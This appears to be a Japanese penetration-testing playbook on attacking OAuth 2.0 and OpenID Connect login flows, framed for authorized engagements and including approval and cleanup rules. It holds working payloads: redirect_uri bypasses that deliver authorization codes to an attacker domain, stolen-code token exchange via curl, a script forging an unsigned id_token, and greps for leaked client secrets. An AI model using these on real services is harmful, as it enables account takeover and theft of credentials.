# OAuth 2.0 / OpenID Connect 認証フロー攻撃

## 着火条件

OAuth / OIDC が使われているかを判定する。下表のシグナルを上から実施し、1 つでも該当すれば本ファイルを使う。**該当ゼロなら閉じてよい**（OAuth は使われていない or 攻撃面が無い）。

| シグナル | 確認方法 | 該当の意味 |
|---|---|---|
| `/.well-known/openid-configuration` が JSON を返す | `curl -s https://[TARGET]/.well-known/openid-configuration \| python3 -m json.tool` | OIDC 確定（パターン 1〜7 すべて検討） |
| `/.well-known/oauth-authorization-server` が JSON を返す | `curl -s https://[TARGET]/.well-known/oauth-authorization-server \| python3 -m json.tool` | OAuth 2.0 確定（OIDC 固有のパターン 4・5 は対象外、それ以外検討） |
| `/oauth/authorize` `/oauth2/auth` `/connect/authorize` のいずれかが 302 / 400 / `missing parameter` を返す | `curl -sI https://[TARGET]/oauth/authorize`（他 URL も順次） | 認可エンドポイント存在 → 認可フロー実装あり |
| UI に「Login with Google / GitHub / Microsoft / Facebook / Apple」等のソーシャルログインボタンがある | ログインページを目視 | ソーシャルログイン経路あり（パターン 5 含む） |
| ログイン後のリクエストに `Authorization: Bearer eyJ...` が含まれる | Burp HTTP history で `Authorization: Bearer ey` を検索 | OIDC id_token / OAuth access token 使用中 |
| アカウント設定画面に「外部 IdP 連携」「Connect with X」UI がある | UI 目視 | アカウント連携機能あり（パターン 2 の攻撃シナリオが成立する環境） |

> いずれも該当しない場合：本ファイルは閉じてよい。トークンベース認証だが OAuth ではない（独自セッショントークン・JWT 単体）場合は `JWT_Attacks.md` へ。Cookie ベースなら `XSS.md`（Cookie 窃取）/ `IDOR.md` を検討。

---

## 環境前提

- 実行環境: テスター端末（被害者ブラウザのシミュレートには別プロファイルの Chrome / Firefox を使う）
- 必要なツール:
  - Burp Suite Community Edition（別途インストール要 / OAuth フロー全体のトレースに必須）
  - `python3` + `PyJWT`（`pip3 install pyjwt cryptography`、id_token の手動検証・偽造に使用）
  - `jwt_tool`（要インストール: `git clone https://github.com/ticarpi/jwt_tool`、id_token 検証バイパスは `JWT_Attacks.md` と同手順）
  - 攻撃者制御の HTTP サーバー（`python3 -m http.server` または Burp Collaborator）
  - 攻撃者制御のドメイン（redirect_uri バイパス・JWKS 公開先として。テスト時は無料の DDNS / ngrok でも可）
- オフライン代替: `python3` 標準ライブラリで authorization URL の組み立て・コールバック受信が可能

---

## 観点・着眼点

着火条件で OAuth/OIDC 使用を確定したら、次は**どの攻撃パターンを試すか**を選ぶための深掘り観察を行う。

### 深掘り 1：`.well-known` JSON の重要フィールドを読む

着火条件で取得した `.well-known/openid-configuration` の JSON から、攻撃面の全体像を読み取る：

| JSON フィールド | 攻撃で使う場面 |
|---|---|
| `issuer` | パターン 4 の `iss` 検証バイパスの正規 issuer 名 |
| `authorization_endpoint` | パターン 1（redirect_uri バイパス）の試行先 |
| `token_endpoint` | パターン 1 で奪った code をアクセストークンに交換する先 |
| `jwks_uri` | パターン 4 の id_token 署名鍵公開先（jku 差し替え攻撃の参考） |
| `code_challenge_methods_supported` | パターン 6 で `plain` が含まれていれば PKCE downgrade 可 |
| `response_types_supported` | パターン 3 で `token` `id_token token` が含まれていれば Implicit Flow 利用可 |

### 深掘り 2：正規ログインを Burp で 1 回通して観察

「Login with X」を 1 回押して HTTP history をキャプチャ。authorization request の URL（`accounts.google.com/o/oauth2/v2/auth?...` 等）を見て以下を読み取る：

| 観察項目 | 判定内容 → 関連パターン |
|---|---|
| `response_type=` の値 | `code` → パターン 1〜2 / `token` → パターン 3 / `code id_token` → パターン 4 |
| `redirect_uri=` の値 | パターン 1 の攻撃対象（バリデーションの強度を試行で確認） |
| `state=` の有無 / 値の random 性 | 無い / 固定値 → パターン 2 成立 |
| `code_challenge=` の有無 | 無い → パターン 6 成立 |
| `code_challenge_method=` の値 | `plain` → パターン 6 downgrade 成立 |
| `nonce=` の有無（OIDC） | 無い → パターン 4 でリプレイ攻撃成立 |
| `scope=` の値 | `openid email profile` 等 / scope 拡大の攻撃面（パターン 1 のついで） |

### 深掘り 3：UI / DevTools で攻撃面を増やす

| 目視対象 | 何を判定するか → 関連パターン |
|---|---|
| 同じ email で複数 IdP からログインできるか試す | パターン 5（email 一致紐付け実装）の判定 |
| DevTools → Application → Local Storage / Cookie の `id_token` `access_token` | JWT 攻撃面の有無（`JWT_Attacks.md` に進む） |
| モバイル app / SPA の場合：JS バンドル / APK の strings 内に client_secret らしき値があるか | パターン 7（client_secret 漏洩）の判定 |

### 深掘り 4：redirect_uri 登録方式の判定（パターン 1 の前段）

完全一致 / プレフィックス / 正規表現 のどれかは、authorize に異なる redirect_uri を渡したときのレスポンスで判定する：

| 試行値 | 返り方 | 判定 |
|---|---|---|
| `redirect_uri=https://[VICTIM_DOMAIN]/callback/extra` | 400 `invalid redirect_uri` | 完全一致（厳格） |
| 同上 | 200 / 302 | プレフィックスマッチ → パターン 1a / 1b 試行可 |
| `redirect_uri=https://[VICTIM_DOMAIN]/callback%2f@evil.com` | 200 / 302 | URL parse 不一致あり → パターン 1b 試行可 |
| `redirect_uri=https://[VICTIM_DOMAIN].evil.com/` | 200 / 302 | サブドメイン許容 → パターン 1a 試行可 |

---

**シグナル → 試みる攻撃パターン：**

| 観測した状態 | 試みる攻撃パターン |
|---|---|
| `redirect_uri=https://[VICTIM]/callback` を改変してエラーにならない | redirect_uri バイパス（パターン1） |
| authorization request に `state=` が無い / 値が固定 | OAuth CSRF / アカウント連携乗っ取り（パターン2） |
| `response_type=token`（fragment に access_token が乗る） | Implicit Flow Token Leakage（パターン3） |
| レスポンスに `id_token=eyJ...` が含まれる | id_token 検証バイパス（パターン4・`JWT_Attacks.md` と同手順） |
| ソーシャルログインで「同じ email なら既存アカウントに紐付ける」挙動 | email / sub 信頼性攻撃（パターン5） |
| authorization request に `code_challenge` が無い | PKCE 欠落（パターン6） |
| モバイル app / SPA から client_secret らしき値が発見できる | client_secret 漏洩悪用（パターン7） |

**攻撃者の思考：** OAuth は「複数当事者（user / client / authorization server / resource server）」の間でトークンが受け渡される設計のため、**どこか一箇所でも「相手を信頼しすぎている」検証スキップ**があれば、トークンを横取り・偽造・流用できる。単発のペイロードでは何も起きないが、フロー全体を俯瞰した「経路」を組み立てるとアカウント乗っ取りに直結する。

**攻撃クラスとチェーンで得るもの（全体図）：**

| 攻撃クラス | 単発の症状 | チェーンで攻撃者が得るもの |
|---|---|---|
| redirect_uri バイパス | 任意 URL に `?code=...` がリダイレクトされる | 被害者の authorization code を奪取 → トークン交換 → **被害者アカウント完全乗っ取り** |
| state 欠落 / CSRF | 被害者のブラウザで攻撃者の code が処理される | 被害者の既存アカウントに **攻撃者のソーシャル ID が連携** → 攻撃者の Google ログインで被害者アカウントに入れる |
| Implicit Token Leak | URL fragment の access_token | Referer / proxy log / ブラウザ履歴経由で漏洩 → **被害者なりすまし** |
| id_token 検証バイパス | 任意 sub の id_token を受け入れる | 任意ユーザーの id_token を偽造 → **任意アカウントへの認証バイパス** |
| email / sub 信頼性 | 攻撃者が制御する IdP で `email=victim@example.com` の id_token を発行 | 既存ユーザーアカウントを email で紐付けて **被害者アカウント乗っ取り** |
| PKCE 欠落 | 認可コードを横取りされても通常は使えない → 使える | code interception 攻撃が成立（モバイル app / public client で深刻） |
| client_secret 漏洩 | 攻撃者が confidential client になりすませる | サーバー側 API を直接叩いて任意ユーザーのトークン取得 / scope 拡大 |

---

## 手順

### パターン1: redirect_uri 検証バイパス

**前提：** authorization server が `redirect_uri` の検証を完全一致以外（プレフィックス・サブストリング・正規表現）で行っている、または検証が緩い場合に成立。

**事前準備（必須）：** 攻撃者制御のドメイン / IP を用意し、code を受信するエンドポイントを用意しておく。

```bash
# [Attacker] code 受信用の HTTP リスナー（Burp Collaborator または以下）
python3 -m http.server 8080
# 到達可能 IP の確認は ../../06_Concepts/Reverse_Shell.md（攻撃側の準備①②）参照
```

#### 1a. サブドメインバイパス（pre-registered URI のサブストリングマッチ）

```
# 正規の authorization request
https://[AUTH_SERVER]/oauth/authorize?
  response_type=code&
  client_id=[CLIENT_ID]&
  redirect_uri=https://[VICTIM_DOMAIN]/callback&
  scope=openid+email&
  state=[RANDOM]

# [Attacker] redirect_uri を以下のように変える
redirect_uri=https://[VICTIM_DOMAIN].[ATTACKER_DOMAIN]/callback
# 「victim.com で始まるなら OK」のような検証をしている実装で通る
```

#### 1b. Path Traversal / Open Redirect 連鎖

```
# [Attacker] パストラバーサルでホスト名を維持しつつパスを操作
redirect_uri=https://[VICTIM_DOMAIN]/callback/../../@[ATTACKER_DOMAIN]/
# URL parser によっては @ 以降がホストとして解釈される

# [Attacker] victim 側に open redirect がある場合の連鎖
redirect_uri=https://[VICTIM_DOMAIN]/redirect?next=https://[ATTACKER_DOMAIN]
# code は一度 victim に届くが、即座に Location ヘッダーで attacker に転送される
# Referer ヘッダー経由でも code が漏れる
```

#### 1c. パラメータ汚染（HPP）

```
# [Attacker] redirect_uri を 2 つ送る
redirect_uri=https://[VICTIM_DOMAIN]/callback&redirect_uri=https://[ATTACKER_DOMAIN]/
# 検証は最初の値・実際のリダイレクトは最後の値、を見る実装で成立
```

#### 1d. ホスト部の異なる表記

```
# [Attacker] IPv4 整数表記・大文字小文字・末尾ドット
redirect_uri=https://VICTIM_DOMAIN.com/callback        # 大文字
redirect_uri=https://[VICTIM_DOMAIN]./callback         # 末尾ドット
redirect_uri=https://①[VICTIM_DOMAIN]/callback         # IDN / Unicode 混入
```

**コードの利用方法：** 攻撃者が受け取った code をトークンエンドポイントに送ってアクセストークンを取得する。

```bash
# [Attacker] code をアクセストークンに交換
curl -X POST https://[AUTH_SERVER]/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=[STOLEN_CODE]" \
  -d "redirect_uri=https://[VICTIM_DOMAIN]/callback" \
  -d "client_id=[CLIENT_ID]" \
  -d "client_secret=[CLIENT_SECRET_IF_PUBLIC]"
# 注: redirect_uri は authorize 時と完全一致が必要（バイパスした値ではなく元の値）
# public client（client_secret 不要）の場合は client_secret パラメータを省略
```

**成功の確認：** 返ってきた `access_token` で被害者のリソースエンドポイント（`/api/me` 等）にアクセスし、被害者の情報が返ればアカウント乗っ取り成立。

**実例（軽く）：** Microsoft アカウントの redirect_uri バイパス（2020 / Sahad Nk 報告。`success.uri` パラメータがサブドメイン検証の隙で攻撃者ドメインを許容）等、redirect_uri 検証ミスは大手 IdP でも繰り返し報告されている。

---

### パターン2: state 欠落・固定による OAuth CSRF（アカウント連携乗っ取り）

**前提：** authorization request に `state` パラメータが含まれない、または含まれていてもコールバック側で検証されていない場合に成立。

**攻撃シナリオ：** 「Google アカウントで連携」機能で、被害者の既存ローカルアカウントに**攻撃者の Google ID を紐付ける**。以降、攻撃者は自分の Google ログインで被害者アカウントに入れる。

```
# [Attacker] 自分の Google アカウントで authorize 経由 → code を受け取る
# だが、code を「自分のブラウザで」消費せず、code をそのまま URL に埋めて被害者に踏ませる

https://[VICTIM_APP]/oauth/callback?code=[ATTACKER_CODE]&state=

# 被害者がログイン中にこの URL を踏むと、被害者のセッションで attacker の code が処理される
# → 被害者アカウントに attacker の Google ID が紐付く
# → 以降、attacker は自分の Google ログインで被害者アカウントに入れる
```

**手順：**

1. 攻撃者が自分の Google で `/oauth/authorize` → `code` を取得（コールバックを止めて code を保存）
2. その code を含む callback URL を被害者に踏ませる（XSS / SNS / 直接送信）
3. 被害者のセッション cookie がついた状態で `/oauth/callback?code=[ATTACKER_CODE]` がアプリに届く
4. アプリは「ログイン済みユーザー（被害者）に Google ID を連携」処理を実行
5. 攻撃者の Google ログイン → 被害者アカウントに入れる

**成功の確認：** ログアウト後、攻撃者の Google アカウントで「Login with Google」を押し、被害者のダッシュボードが表示されれば成立。

---

### パターン3: Implicit Flow Token Leakage

**前提：** `response_type=token`（または `id_token token`）で、access_token / id_token が URL fragment (`#access_token=...`) として返される場合。fragment はサーバーに送信されないが、ブラウザ・Referer・JS 経由で漏洩する。

**観測点：**

```
# [Attacker] 認可レスポンスの形式
https://[VICTIM_DOMAIN]/callback#access_token=[TOKEN]&token_type=bearer&expires_in=3600
```

**漏洩経路：**

| 経路 | 条件 |
|---|---|
| Referer ヘッダー | callback ページから外部リソース（画像・スクリプト・analytics）を読み込んでいる場合、fragment は Referer に含まれないが、JS で `window.location.href` 全体を外部送信している実装では漏れる |
| ブラウザ履歴 | 共有 PC・スクリーン共有・XSS で `history.entries` 取得 |
| 親フレーム経由 | iframe 内で OAuth フローを完結している場合、`postMessage` の origin チェックミスで漏洩 |
| 開発者ツール由来 | analytics タグが `location.hash` を送信している実装 |

**確認手順：**

```bash
# [Attacker] callback ページのソースを確認し、location.hash を読み出している JS を特定
curl -s https://[VICTIM_DOMAIN]/callback | grep -iE "location\.hash|window\.location\.href"
```

callback ページから読み込まれる外部リソース（analytics・font・CDN）への Referer に access_token が含まれていれば漏洩成立。Burp の HTTP history で `Referer:` を全件 grep して `access_token` 文字列を検索する。

---

### パターン4: id_token 検証バイパス（OIDC 固有）

**前提：** OpenID Connect 対応の認可サーバーが返す `id_token`（JWT）の検証実装に不備がある場合に成立。詳細手順は `JWT_Attacks.md` と同等。

**OIDC 固有の検証項目（攻撃者視点）：**

| 検証項目 | スキップされている場合に攻撃者ができること |
|---|---|
| 署名検証（`alg`） | id_token を任意の sub / email で偽造可能 |
| `iss`（発行者） | 攻撃者制御の認可サーバーが発行した id_token を受け入れる |
| `aud`（対象クライアント） | 別 client_id 向けの id_token を流用 |
| `azp`（authorized party） | 同上、multi-tenant 環境で他テナント向けトークンを流用 |
| `nonce` | リプレイ攻撃成立 |
| `exp` | 有効期限切れトークンの再利用 |

**手順：** `JWT_Attacks.md` のパターン 2（alg:none）/ パターン 4（RS256→HS256）/ パターン 5（jku 差し替え）をそのまま適用する。id_token は `aud` と `nonce` の検証も併せて崩す必要がある点だけ追加。

```python
# [Attacker] id_token 偽造例（署名検証スキップ実装に対して）
import jwt, time
forged = jwt.encode({
    "iss": "https://[AUTH_SERVER]",   # 正規 issuer に偽装
    "sub": "[VICTIM_USER_ID]",        # 標的ユーザーの sub
    "aud": "[CLIENT_ID]",
    "exp": int(time.time()) + 3600,
    "iat": int(time.time()),
    "nonce": "[NONCE_FROM_REQUEST]",  # authorization request の nonce を流用
    "email": "[VICTIM_EMAIL]",
    "email_verified": True            # ← パターン 5 への布石
}, "", algorithm="none")
print(forged)
```

---

### パターン5: email / sub 信頼性攻撃（IdP 連携の信頼境界破り）

**前提：** ソーシャルログイン実装が「**email が一致したら既存のローカルアカウントと紐付ける**」設計になっており、かつ `email_verified` フラグを検証していない、または攻撃者が制御できる IdP（自己ホスト Keycloak / 独自 OIDC プロバイダ）が許容されている場合に成立。

**攻撃シナリオ A：複数 IdP 受け入れ環境（`email_verified` 不検証）**

```
# [Attacker] 攻撃者が制御する IdP（または email 編集可能なソーシャル IdP）で
# email=victim@example.com の id_token を発行 → 標的アプリに送る
# 標的アプリは email で既存アカウントを引き → ログイン成立 → 被害者乗っ取り
```

**攻撃シナリオ B：sub の使い回し誤解**

`sub` は IdP 内でユニークだが、**IdP 間ではユニークではない**。複数 IdP を受け入れているアプリが sub だけで一意性を判定していると、別 IdP の同じ数値 sub を持つユーザーが衝突する。

**確認手順：**

1. 標的アプリのソーシャルログインが対応している IdP を列挙（UI のボタン・`/.well-known/openid-configuration` の `issuers_supported`）
2. 攻撃者制御の IdP で `email=[VICTIM_EMAIL]` `email_verified=true` の id_token を発行
3. 標的アプリのログインフローに id_token を渡し、ログインが成立するか確認

**「nOAuth」（Descope 発見・2023）はこの類型の実例。Microsoft Azure AD マルチテナント OAuth アプリにおいて、email クレームが mutable かつ未検証であることを悪用し、攻撃者が自分の Azure AD アカウントの email を被害者のアドレスに変更することでアカウント乗っ取りが成立した。複数 tenant / 複数 IdP を受け入れる環境では `iss + sub` のペアで一意性を判定する必要がある。**

---

### パターン6: PKCE 欠落・downgrade

**前提：** authorization request に `code_challenge` パラメータが無い、または `code_challenge_method=plain`（実質 PKCE 無効）が許容される場合に成立。public client（モバイル app / SPA）では特に深刻だが、RFC 9700 は confidential client にも PKCE を推奨しており、サーバー側での対応が必要。

**攻撃シナリオ：** モバイル app / SPA で OAuth フローを実装している場合、custom URL scheme（`myapp://callback?code=...`）または localhost コールバックを別の悪意あるアプリ / ブラウザ拡張が横取りできる。PKCE があれば code を取得しても code_verifier が無いとトークン交換できないが、PKCE 無しなら即座にトークン取得可能。

```
# 正規リクエスト（PKCE 無し）
https://[AUTH_SERVER]/oauth/authorize?response_type=code&client_id=[CLIENT_ID]&redirect_uri=myapp://callback

# [Attacker] 同じ custom scheme を登録した悪意あるアプリで code 横取り
# → そのまま token endpoint へ送ってアクセストークン取得
curl -X POST https://[AUTH_SERVER]/oauth/token \
  -d "grant_type=authorization_code" \
  -d "code=[INTERCEPTED_CODE]" \
  -d "redirect_uri=myapp://callback" \
  -d "client_id=[CLIENT_ID]"
```

**downgrade 攻撃：** `code_challenge_method=plain` を強制すると、`code_verifier=code_challenge` で通ってしまうため、code を横取りした攻撃者が同じ値で verify を通せる。サーバーが `S256` のみを受け入れるか確認する。

---

### パターン7: client_secret 漏洩

**前提：** confidential client（client_secret を持つ）の secret が公開環境（モバイル app バンドル / SPA の JS / GitHub repo / モバイル app 復号後の strings）にハードコードされている場合に成立。

**確認手順：**

```bash
# [Attacker] モバイル app の場合
# Android: APK を apktool で展開し strings で grep
apktool d [APP].apk -o [OUT_DIR]
grep -rE "client[_-]?secret|[a-f0-9]{32,}" [OUT_DIR]/

# iOS: ipa を unzip し Mach-O の __TEXT,__cstring セクションを strings
unzip [APP].ipa -d [OUT_DIR]
strings [OUT_DIR]/Payload/[APP].app/[BINARY] | grep -iE "secret|client_id"

# SPA の場合
curl -s https://[VICTIM_DOMAIN]/static/js/main.*.js | grep -iE "client[_-]?secret|[a-f0-9]{32,}"
```

```bash
# [Attacker] GitHub に意図せず公開されていないか
# 例: organization 名で client_secret 文字列を検索（authenticated search が必要）
# gh search code "client_secret org:[ORG_NAME]"
```

**悪用例：** client_secret を入手したら、authorization code を交換するときに client として認証できる。さらに `grant_type=refresh_token` で長期アクセスを維持できる場合がある。

---

## 刺さらなかったとき

- **redirect_uri を変えると 400 が返る** → 完全一致検証されている。サブドメイン・open redirect 連鎖（パターン 1b）を試す。それも通らなければ Implicit Flow の有無を確認（パターン 3）
- **state が空でも CSRF が成立しない** → callback 側でセッション・nonce と紐付けて検証されている。同じ session 内での race condition / 別タブからの authorize 起動を試す
- **id_token の `alg:none` が拒否される** → `JWT_Attacks.md` のパターン 3〜7 を試す。OIDC 固有としては `aud` を別 client_id にして他テナント向けトークン流用を試す
- **email_verified 検証されている** → 攻撃者制御 IdP のシナリオは封じられる。同じ IdP 内で email 変更 + 再認証で `email_verified=true` を取り直せる IdP（一部の OIDC プロバイダ）がないか確認
- **PKCE が必須化されている** → public client では順当な実装。confidential client 側（サーバー間通信）に攻撃面を移す
- **client_secret が JS バンドルに無い** → SPA が backend-for-frontend（BFF）パターンを使っている。BFF サーバー側の脆弱性に攻撃面を移す
- **全パターンで通らない** → 認可フロー自体は堅牢。発行されたアクセストークンの取り扱い（リソースサーバー側の scope 検証・トークン保存場所）に攻撃面を移す

---

## 注意点・落とし穴

- **OAuth はフレームワーク・SaaS ごとに「拡張」があり挙動が異なる** → Auth0 / Okta / Keycloak / AWS Cognito / Firebase Auth / Azure AD（Entra ID）/ Google Identity / Apple Sign In それぞれの quirks がある。例えば Apple Sign In は email を private relay で隠す機能があり、`email_verified` の解釈が独自
- **fragment（`#`）はサーバーログに残らない** → Implicit Flow の access_token 漏洩を server-side ログだけで確認しようとすると検出できない。ブラウザ DevTools / Burp HTTP history で確認する
- **authorization code は通常 1 回しか使えない** → 攻撃者が先に消費してしまうと被害者側でエラーになり気付かれる。被害者が踏む前に消費しない（パターン 1）/ 消費したい場合は被害者が気付くタイミングを考慮する（パターン 2 ではセッション cookie が attacker のものではないので問題ない）
- **id_token と access_token を混同しない** → id_token は OIDC の「認証結果の証明」（JWT）、access_token は「リソース API の認可」。id_token は client が検証する、access_token は resource server が検証する。攻撃面が違う
- **`prompt=none` の挙動** → SSO セッションが有効なら同意画面を出さずに即 code を返す。攻撃者が「被害者がログイン中か」を判定するサイドチャネルにもなる
- **redirect_uri は authorize 時と token 交換時で完全一致が必要**（パターン 1 で code を奪っても token 交換時に元の redirect_uri を指定する必要がある）
- **モバイル app の custom URL scheme は OS レベルで保証されない** → 同じ scheme を登録した別 app が起動順序で先に受け取る可能性がある。Universal Links / App Links を使った実装が推奨されているが、未対応のアプリも多い

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）— 認証バイパス・アカウント乗っ取りに該当するため、被害者役のテストアカウントが用意されているか、攻撃者役のアカウント連携を試してよいかを事前確認
- **想定される SIEM/EDR 検知**: 認可サーバーのアクセスログ（`redirect_uri` の異常値・短時間に複数の `client_id` への authorize 試行）/ token endpoint への異常リクエスト
- **業務影響リスク**: 中（攻撃者のソーシャル ID を被害者アカウントに紐付けた状態のまま放置するとログイン乗っ取りが残る）
- **原状回復必須項目**:
  - ✅ パターン 2 で被害者役アカウントに紐付けた攻撃者の IdP 連携を解除
  - ✅ パターン 7 で取得した client_secret は暗号化保管・案件終了時破棄
  - ✅ 検証中に発行したアクセストークン・リフレッシュトークンを revoke
- **取得情報の取扱**: id_token・access_token・client_secret は全て認証情報扱い。暗号化保管・案件終了時破棄
- **演習環境での扱い**: 制約なし

---

## 関連技術

- 前：Web 列挙で OAuth エンドポイントを発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：レスポンス一次トリアージで id_token / access_token を検出 → `../../01_Reconnaissance/Web_Response_Triage.md`
- 後：id_token 詳細検証バイパス（alg / kid / jku / jwk 攻撃）→ `./JWT_Attacks.md`
- 後：認証バイパス成立後の API 列挙・権限昇格 → `./IDOR.md` / `./Command_Injection.md`
- 関連：Implicit Flow の token 漏洩経路として XSS が起点になる場合 → `./XSS.md`
- 関連：redirect_uri バイパスで Open Redirect を連鎖する場合 → `./Open_Redirect.md`（パターン 4）
